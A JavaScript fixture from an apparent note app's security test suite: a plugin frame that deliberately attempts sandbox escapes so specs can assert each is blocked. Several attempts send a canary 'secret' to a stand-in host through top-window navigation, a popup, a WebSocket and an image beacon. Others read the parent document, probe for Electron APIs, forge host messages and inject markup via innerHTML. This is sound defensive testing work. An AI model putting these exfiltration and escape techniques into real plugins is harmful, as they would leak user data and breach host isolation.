// A plugin view that tries everything a plugin frame must not do (#2824).
// Each attempt is wired to a click, so it runs with user activation — the
// strongest form a real plugin's attempt could take.
window.scriptRan = true;
const LEAK = 'https://example.com/leak?secret=plugin-frame-canary';
document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('top-nav').addEventListener('click', () => {
    try { window.top.location.href = LEAK; } catch (e) { window.topNavError = String(e); }
  });
  document.getElementById('self-nav').addEventListener('click', () => {
    window.location.href = 'other.html';
  });
  document.getElementById('popup').addEventListener('click', () => {
    window.popupResult = String(window.open(LEAK));
  });
});


// More of what plugin code must not do (#2832), each a function the specs
// call and assert on: `tests/security/plugin-corpus-coverage.test.ts` holds
// every one to a spec that uses it (`PLUGIN_CODE_CORPUS`).
const settle = (start, ms = 3000) => new Promise((resolve) => {
  const timer = setTimeout(() => resolve('blocked: no answer'), ms);
  start((v) => { clearTimeout(timer); resolve(v); });
});
window.attempts = {
  // Node, by module: a frame is web content, so there is no `node:` to load.
  async importFs() {
    try { await import('node:fs'); return 'LOADED'; } catch (e) { return `blocked: ${e.name}`; }
  },
  websocket() {
    return settle((done) => {
      try {
        const ws = new WebSocket('wss://example.com/leak?secret=plugin-frame-canary');
        ws.onopen = () => done('OPEN');
        ws.onerror = () => done('blocked');
      } catch (e) { done(`blocked: ${e.name}`); }
    });
  },
  beacon() {
    return settle((done) => {
      const img = new Image();
      img.onload = () => done('LOADED');
      img.onerror = () => done('blocked');
      img.src = LEAK;
    });
  },
  parentDocument() {
    try { return `READ: ${window.parent.document.title}`; } catch (e) { return `blocked: ${e.name}`; }
  },
  appApi() {
    return { ipcRenderer: typeof window.ipcRenderer, electron: typeof window.electron, require: typeof window.require, api: typeof window.api };
  },
  // Pretend to be the host: the app's own session-port message and an intent, posted from here.
  forgeHostMessage(path) {
    const { port1 } = new MessageChannel();
    window.parent.postMessage({ type: 'minerva.plugin-session-port', sessionId: 'forged' }, '*', [port1]);
    window.top.postMessage({ kind: 'openNote', path }, '*');
    return 'posted';
  },
  // A note's text put into the page as markup, as a careless view would.
  inject(html) {
    const div = document.createElement('div');
    div.id = 'injected';
    div.innerHTML = html;
    document.body.appendChild(div);
    return document.getElementById('injected').innerHTML.length > 0;
  },
};
